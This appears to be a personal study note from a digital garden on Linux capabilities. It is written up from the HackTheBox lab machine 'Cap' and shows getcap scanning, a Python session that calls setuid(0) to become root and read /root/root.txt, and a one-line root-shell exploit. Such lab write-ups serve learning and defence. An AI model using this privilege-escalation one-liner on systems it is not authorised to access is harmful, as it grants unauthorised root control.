---
{"dg-publish":true,"permalink":"/garden/knowledge-base/linux-capabilities/","tags":["hacking","programming/linux"],"created":"2022-05-28 21:16","updated":"2026-01-06 13:33"}
---

# Linux Capabilities
home: [[02-Area/hacking/privilege escalation/linux/Linux Privilege Escalation#capabilities\|Linux Privilege Escalation#capabilities]]

Capabilities is a way to break down root permission typically done using `setuid` or `setgid` permissions. This way, the permission is restricted to purely what is necessary, for example for wireshark to be able to capture packets without being root user.

`setcap` is used to set binary capabilities.

```bash
$ setcap cap_setuid+ep /usr/bin/python3.8
```

Use the following command to scan for the binaries with the capabilities.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid+ep
```

This means you can use `python3.8` binary to `setuid(0)`

```bash
nathan@cap:/var/www/html$ /usr/bin/python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os;
>>> os.setuid(0)
>>> os.system("whoami")
root
0
>>> os.system("cat /root/root.txt")
7884e4924c37f8435b71c29001fc9034
0
>>>

```

The file permissions indicate it does not have sticky bit permission also known as suid permission.

```bash
nathan@cap:~$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
nathan@cap:~$ ls -la /usr/bin/python3.8
-rwxr-xr-x 1 root root 5486384 Jan 27 15:41 /usr/bin/python3.8
nathan@cap:~$ stat /usr/bin/python3.8
  File: /usr/bin/python3.8
  Size: 5486384         Blocks: 10720      IO Block: 4096   regular file
Device: fd00h/64768d    Inode: 448         Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2021-06-20 11:21:59.303061147 +0000
Modify: 2021-01-27 15:41:15.000000000 +0000
Change: 2021-05-15 21:40:29.089198724 +0000
 Birth: -
nathan@cap:~$
```

`setcap` is used to set capabilities of the binary. This is just like `setuid` but it seems to be more secure.

## Exploit

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

## References

- <https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/>
- Encountered this upon using LinPeas.sh on HTB machine Cap for local privilege escalation
- <https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-with-environment-docker-breakout-1>

It seems like this can be used to breakout from [[02-Area/programming/Linux/Docker\|Docker]] as well.
